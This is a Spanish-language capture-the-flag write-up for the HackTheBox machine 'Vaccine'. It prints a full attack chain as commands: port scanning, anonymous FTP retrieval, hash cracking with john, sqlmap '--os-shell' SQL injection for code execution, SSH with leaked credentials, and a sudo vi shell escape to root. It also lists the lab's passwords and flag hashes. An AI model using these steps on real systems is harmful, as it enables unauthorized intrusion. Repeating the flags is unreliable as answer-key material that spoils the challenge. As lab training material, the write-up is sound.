---
titulo: "Vaccine"
descripcion: "FTP anónimo expone backup con hash MD5. SQLi en dashboard permite RCE como postgres. Credenciales en código fuente dan SSH. Privesc vía sudo vi (GTFOBins)."
fecha: 2026-06-06
dificultad: medium
herramientas: ["nmap", "ftp", "john", "sqlmap", "ssh"]
categoria: htb
plataforma: HackTheBox
completado: true
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.58.189
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p21,22,80 -sCV 10.129.58.189
```

Puertos abiertos:
- **21/tcp (vsftpd 3.0.3)** — login anónimo permitido, archivo `backup.zip` disponible
- **22/tcp (OpenSSH 8.0p1 — Ubuntu)**
- **80/tcp (Apache httpd 2.4.41)** — login page "MegaCorp"

## Foothold

### FTP anónimo

```bash
ftp 10.129.58.189
# Usuario: anonymous / Password: (vacío)
get backup.zip
```

El zip está protegido por contraseña. Se extrae el hash y se crackea:

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Contraseña del zip:** `741852963`

```bash
unzip backup.zip
```

### Credenciales en código fuente

`index.php` contiene hash MD5 hardcodeado:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

Crackeo del hash:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.txt
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

**Credenciales:** `admin:qwerty789`

### SQL Injection

Login en `http://10.129.58.189` con las credenciales obtenidas. El dashboard expone una barra de búsqueda vulnerable a SQLi (confirmado con `'`).

Enumeración y explotación con sqlmap:

```bash
sqlmap -u "http://10.129.58.189/dashboard.php?search=test" --cookie="PHPSESSID=<session>" --os-shell --batch
```

**DBMS:** PostgreSQL. RCE obtenido como usuario `postgres`.

### Credenciales en dashboard.php

Desde os-shell, se leen credenciales de base de datos en el código fuente:

```bash
cat /var/www/html/dashboard.php
```

**Credenciales:** `postgres:P@s5w0rd!`

### Acceso SSH

```bash
ssh postgres@10.129.58.189
```

Shell interactiva obtenida. Flag de usuario en `~/user.txt`.

## Escalada de Privilegios

Verificación de permisos sudo:

```bash
sudo -l
```
Output:
```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`postgres` puede ejecutar `vi` como root sobre ese archivo. Vi permite escapar a shell con `:!comando` — misconfiguración clásica (GTFOBins).

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro de vi:

```
:!/bin/bash
```

Shell root obtenida.

```bash
cat /root/flag.txt
```

## Flags

| Flag | Hash |
|------|------|
| User | `ec9b13ca4d6229cd5cc1e09980965bf7` |
| Root | `dd6e058e814260bc70e9bbdef2715849` |
